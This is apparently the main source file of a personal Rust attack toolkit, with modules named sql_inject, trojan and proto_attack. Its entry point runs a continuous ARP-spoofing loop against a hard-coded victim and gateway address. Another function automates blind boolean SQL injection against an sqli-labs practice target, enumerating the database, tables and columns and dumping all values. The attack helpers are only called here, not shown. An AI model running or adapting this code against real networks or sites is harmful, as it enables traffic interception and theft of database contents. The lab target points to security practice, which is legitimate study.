use std::collections::HashMap;
use std::net::Ipv4Addr;

use pnet::datalink::MacAddr;
use regex::Regex;

use crate::proto_attack::arp::spoof::*;
use crate::sql_inject::blind::bool::*;

mod sql_inject;
mod trojan;
mod proto_attack;

#[tokio::main]
async fn main() {
    arp_spoof_test();
}


async fn blind_sql_inject_test() {
    let re = Regex::new(r"[, ]+").unwrap();
    let url = "http://100.80.144.127/sqli-labs/Less-8/";

    let database = get_database(url).await;

    let tables = get_tables(url, &database).await;
    let table_vec: Vec<&str> = re.split(&tables).collect();

    let mut columns_map: HashMap<String, Vec<String>> = HashMap::new();

    let mut values_map: HashMap<String, Vec<String>> = HashMap::new();

    // 获取各表所有的列名
    for table in &table_vec {
        let columns: String = get_columns(url, &database, table).await;
        let column_vec: Vec<String> = re.split(&columns).map(|x| x.to_string()).collect();

        // 获取各表所有的值
        let values: String = get_values(url, table, &column_vec).await;
        let value_vec: Vec<String> = re.split(&values).map(|x1| x1.to_string()).collect();

        values_map.insert(table.to_string(), value_vec);
        columns_map.insert(table.to_string(), column_vec);
    }

    println!("{}", &database);
    println!("{:?}", &table_vec);
    println!("{:?}", &columns_map);
    println!("{:?}", &values_map);
}

fn arp_spoof_test() {
    loop {
        attack(MacAddr(0x69, 0x3e, 0x5f, 0x52, 0xa0, 0xf9),
               Ipv4Addr::new(172, 20, 10, 13),
               Ipv4Addr::new(172, 20, 10, 1));
    }
}